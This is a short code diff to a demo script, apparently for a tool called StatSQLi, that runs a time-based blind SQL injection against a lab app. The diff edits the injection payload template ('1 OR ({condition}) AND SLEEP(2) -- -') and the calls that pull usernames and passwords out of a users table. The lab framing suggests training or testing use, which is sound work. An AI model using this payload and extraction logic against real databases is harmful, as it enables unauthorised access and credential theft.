@@ -33,7 +33,8 @@ def demo_extraction():
     
     # For SQLite, we need a special payload since SLEEP() doesn't exist
     # The lab app simulates SLEEP() detection
-    payload_template = "1 OR ({condition}) AND 1=1"  # Lab app will detect SLEEP() in condition
+    # Format: condition should be followed by AND SLEEP, like: (condition) AND SLEEP(2)
+    payload_template = "1 OR ({condition}) AND SLEEP(2) -- -"
     
     print("[*] Initializing StatSQLi...")
     print(f"[*] Target: {url}")
@@ -56,7 +57,7 @@ def demo_extraction():
         result = tool.extract_string_custom(
             table="users",
             column="username",
-            where_clause="1=1 LIMIT 0,1",
+            where_clause="1=1",
             max_length=20
         )
         
@@ -74,7 +75,7 @@ def demo_extraction():
         password = tool.extract_string_custom(
             table="users",
             column="password",
-            where_clause="1=1 LIMIT 0,1",
+            where_clause="1=1",
             max_length=30
         )
         
